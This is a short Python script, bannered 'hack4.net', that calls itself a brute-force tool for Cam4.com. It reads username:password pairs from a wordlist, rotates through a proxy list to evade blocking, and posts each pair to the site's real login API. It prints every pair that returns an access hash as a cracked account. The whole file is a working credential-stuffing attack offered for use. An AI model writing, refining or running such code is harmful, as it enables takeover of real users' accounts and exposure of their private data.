import requests,json,re
from requests.exceptions import ConnectionError,ProxyError,ChunkedEncodingError

print("""

 ###  ##     ####  ###### ###  ##     ####
 ###  ##    ##### ###  ## ### ##     #####
 ###  ##   ## ### ###     #####     ## ###
 #######  ##  ### ###     #####    ##  ###
 ###  ## ######## ###     ### ##   #######
 ###  ## ##   ### ###  ## ###  ##      ###
 ###  ## ##   ###  #####  ###  ##      ###
::::::::::::::::hack4.net:::::::::
:::::::::Cam4.com Brute Force Tool::::::::::
    """)

with open('wordlist', 'r') as file:
  data = file.read().split('\n')
  x = 0
  out = []
  for user in data:
    split = user.split(':')
    username = split[0]
    password = split[1]
    with open('proxy.txt', 'r') as proxy:
      proxyData = proxy.read().split('\n')
      def cam4(x):
          print("testing "+ username+ " Proxy: "+ proxyData[x])
          r = requests.post('http://api.cam4.com/loginnonweb', {"app":"COMMUNICATOR", "username": username, "password":password}, proxies={"http":proxyData[x]})
          if (r.text.find("accessHash") > -1):
            print("Username: "+username+ " Password: "+password)
          out.append(r.text)
      try:
        cam4(x)
      except ConnectionError as e:
        try:
          cam4(x+1)
        except ProxyError as p:
          try:
            cam4(x+1)
          except ChunkedEncodingError as c:
            cam4(x+1)
      if (x != len(proxyData)-1):
        x+=1
      else:
        x=0
  outz = open("out", "w")
  outz.write(str(out))
  outz.close()